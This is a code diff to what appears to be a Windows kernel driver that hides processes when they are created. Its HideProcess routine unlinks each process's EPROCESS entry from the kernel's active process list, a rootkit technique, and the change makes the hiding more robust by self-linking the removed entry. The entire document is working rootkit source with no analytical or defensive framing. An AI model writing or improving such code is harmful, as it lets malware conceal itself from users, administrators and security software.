@@ -61,11 +61,15 @@ namespace filter
 			RtlCopyMemory(name, &process_name->Buffer[ans+1], mem_size);
 			DebugMessage("Process created with PID %d and name length %d, name %S", (int)pid, process_name->Length, name);
 
-			if (HideProcess(peprocess) == true)
+			bool status = false;
+
+			status = HideProcess(peprocess);
+
+			if (status == true)
 			{
 				DebugMessage("Hide oke");
 			}
-			
+
 		}
 	}
 
@@ -76,12 +80,9 @@ namespace filter
 		P_CUSTOM_EPROCESS cur_p_eprocess, pre_p_eprocess, next_p_eprocess;
 		PLIST_ENTRY pre_p_list_entry_eprocess, next_p_list_entry_eprocess;
 
-		KIRQL  new_irql = DISPATCH_LEVEL;
-		KIRQL old_irql = DISPATCH_LEVEL;
-
 		KeAcquireGuardedMutex(&process_lock_);
 
-		cur_p_eprocess = (P_CUSTOM_EPROCESS)(PVOID)peprocess;
+		cur_p_eprocess = peprocess;
 
 		pre_p_list_entry_eprocess = cur_p_eprocess->ActiveProcessLinks.Blink;
 		next_p_list_entry_eprocess = cur_p_eprocess->ActiveProcessLinks.Flink;
@@ -89,7 +90,10 @@ namespace filter
 		next_p_eprocess = CONTAINING_RECORD(next_p_list_entry_eprocess, _CUSTOM_EPROCESS, ActiveProcessLinks);
 		pre_p_eprocess->ActiveProcessLinks.Flink = next_p_list_entry_eprocess;
 		next_p_eprocess->ActiveProcessLinks.Blink = pre_p_list_entry_eprocess;
-			
+		
+		cur_p_eprocess->ActiveProcessLinks.Blink = (PLIST_ENTRY)&(peprocess->ActiveProcessLinks.Flink);
+		cur_p_eprocess->ActiveProcessLinks.Flink = (PLIST_ENTRY)&(peprocess->ActiveProcessLinks.Flink);
+
 		KeReleaseGuardedMutex(&process_lock_);
 
 		return true;
